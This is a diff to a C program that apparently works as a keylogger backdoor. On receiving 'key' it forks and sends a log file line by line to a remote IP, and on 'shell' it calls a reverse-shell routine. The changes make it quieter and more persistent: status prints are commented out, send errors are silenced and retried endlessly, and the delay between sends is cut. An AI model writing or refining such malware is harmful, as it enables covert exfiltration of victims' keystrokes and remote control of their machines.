@@ -6,6 +6,7 @@
 #include <paths.h>
 #include <string.h>
 #include <unistd.h>
+#include <time.h>
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
@@ -29,14 +30,14 @@ int main(int argc, char *argv[]) {
             read(fd, buf, 100);
             if (strncmp(buf, "key", 3) == 0) {
                 if (fork() == 0) {
-                    printf("Sending log\n");
+                    //printf("Sending log\n");
                     sendLog(argv[1]);
                     exit(0);
                 }
             }
             else if (strncmp(buf, "shell", 5) == 0) {
                 if (fork() == 0) {
-                    printf("Sending shell\n");
+                    //printf("Sending shell\n");
                     //sprintf(cmd, "python /remote.py %s %d", argv[1], PORT);
                     //system(cmd);
                     reverseShell(argv[1]);
@@ -85,11 +86,11 @@ int sendLog(char* ip) {
     char sendbuf[100] = {0};
     while (fgets(sendbuf,100,log) != NULL) {
         printf("Sending: %s\n", sendbuf);
-        if (send(sockfd, sendbuf, 100, 0) == -1){
-              perror("send");
-              return 1;
+        while (send(sockfd, sendbuf, 100, 0) == -1){
+              //perror("send");
+              continue;
         }
-        sleep(1);
+        usleep(100000);
 
     }
 
